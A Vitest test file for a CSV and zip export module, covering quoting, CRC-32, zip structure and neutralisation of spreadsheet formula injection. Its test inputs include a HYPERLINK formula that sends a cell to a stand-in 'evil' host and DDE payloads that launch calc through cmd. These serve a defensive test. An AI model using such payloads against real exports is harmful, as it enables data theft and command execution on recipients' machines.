import { describe, expect, it } from "vitest";
import { buildZip, crc32, csvDollars, csvEscape, toCsv } from "./pack";

describe("csv", () => {
  it("escapes quotes, commas, and newlines", () => {
    expect(csvEscape('He said "hi", ok')).toBe('"He said ""hi"", ok"');
    expect(csvEscape("plain")).toBe("plain");
  });
  it("builds CRLF-terminated csv", () => {
    expect(toCsv(["a", "b"], [["1", "x,y"]])).toBe('a,b\r\n1,"x,y"\r\n');
  });
  it("renders cents as plain dollars", () => {
    expect(csvDollars(123456)).toBe("1234.56");
    expect(csvDollars(-5)).toBe("-0.05");
    expect(csvDollars(0)).toBe("0.00");
  });
});

describe("zip", () => {
  it("crc32 matches the known vector", () => {
    // CRC-32 of ASCII "123456789" is 0xCBF43926 (canonical test vector).
    expect(crc32(new TextEncoder().encode("123456789"))).toBe(0xcbf43926);
  });
  it("produces a structurally valid store-only zip", () => {
    const zip = buildZip([
      { name: "a.csv", content: "x,y\r\n1,2\r\n" },
      { name: "b.csv", content: "hello\r\n" },
    ]);
    const dv = new DataView(zip.buffer);
    // local header magic at 0
    expect(dv.getUint32(0, true)).toBe(0x04034b50);
    // end-of-central-directory magic in the last 22 bytes
    expect(dv.getUint32(zip.length - 22, true)).toBe(0x06054b50);
    // entry count = 2
    expect(dv.getUint16(zip.length - 22 + 8, true)).toBe(2);
    // first file name follows its 30-byte header
    const name = new TextDecoder().decode(zip.slice(30, 35));
    expect(name).toBe("a.csv");
  });
});

describe("csvEscape — spreadsheet formula neutralisation", () => {
  // The attack path is real and unauthenticated: the public booking form
  // stores a caller-supplied name verbatim, and that name reaches the account
  // export, the CPA pack, and the journal handed to the accountant.
  it("neutralises every formula lead character", () => {
    for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
      const out = csvEscape(`${lead}HYPERLINK("https://evil/?x="&A1,"Invoice")`);
      expect(out.replace(/^"/, "").startsWith("'")).toBe(true);
    }
  });

  it("still quotes and doubles quotes after neutralising", () => {
    expect(csvEscape('=cmd|" /C calc"!A0')).toBe(`"'=cmd|"" /C calc""!A0"`);
  });

  it("leaves ordinary values completely untouched", () => {
    expect(csvEscape("Desert Aire Mechanical")).toBe("Desert Aire Mechanical");
    expect(csvEscape("1234.56")).toBe("1234.56");
    expect(csvEscape(4200)).toBe("4200");
  });

  it("leaves NEGATIVE NUMBERS numeric — they lead with '-' but are not formulas", () => {
    // Caught by this test: prefixing these would turn every credit in the CPA
    // pack into text Excel refuses to sum. Money reaches csvEscape via toCsv,
    // so exempting plain numbers is required, not cosmetic.
    expect(csvEscape("-500")).toBe("-500");
    expect(csvEscape(csvDollars(-50000))).toBe("-500.00");
    expect(csvEscape("-1234.56")).toBe("-1234.56");
    // ...but a dash-led SENTENCE is still neutralised.
    expect(csvEscape("-1+1+cmd|' /C calc'!A0")).toBe("'-1+1+cmd|' /C calc'!A0");
  });
});
